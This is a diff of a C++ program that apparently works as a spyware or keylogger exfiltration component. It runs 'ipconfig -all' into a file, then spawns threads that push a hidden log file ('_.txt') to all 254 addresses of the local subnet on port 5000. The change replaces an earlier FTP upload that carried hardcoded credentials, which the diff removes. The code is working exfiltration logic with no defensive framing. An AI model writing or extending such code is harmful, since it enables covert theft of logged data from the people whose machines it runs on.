@@ -1,10 +1,11 @@
 #include "LogSender.hpp"
-#include "FTP.hpp"
 #include <stdlib.h>
 #include <string>
 #include <stdio.h>
 #include <fstream>
 #include <iostream>
+#include <thread>
+#include <chrono>
 #include <math.h>
 
 using namespace std;
@@ -62,6 +63,10 @@ string get_ip_from_decimal(unsigned long ip) {
     return result;
 }
 
+void send_logs(LogSender l) {
+    l.send_logs("./_.txt");
+}
+
 int main() {
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
@@ -89,14 +94,25 @@ int main() {
 
     // 33 = 00000000 00000000 00000000 00100001
 
-    for (int i = 0; i < 1; i++) {
-        FTP * ftp = new FTP(get_ip_from_decimal(network_address).c_str(), "kolio", "099824058");
-        // FTP * ftp = new FTP("10.10.40.188", "kolio", "099824058");
-        LogSender l(ftp);
-        
-        l.send_logs("/_.txt");
+    thread threads[254];
 
+    for (int i = 0; i < 254; i++) {
+        cout << i << endl;
+
+        sockaddr_in addr;
+
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = inet_addr(get_ip_from_decimal(network_address).c_str());
+        addr.sin_port = htons(5000);
+
+        LogSender l(&addr);
+
+        threads[i] = thread(send_logs, l);
         network_address += 1;
+    }
+
+    for (int i = 0; i < 254; i++) {
+        threads[i].join();
     }
 
     return  0;
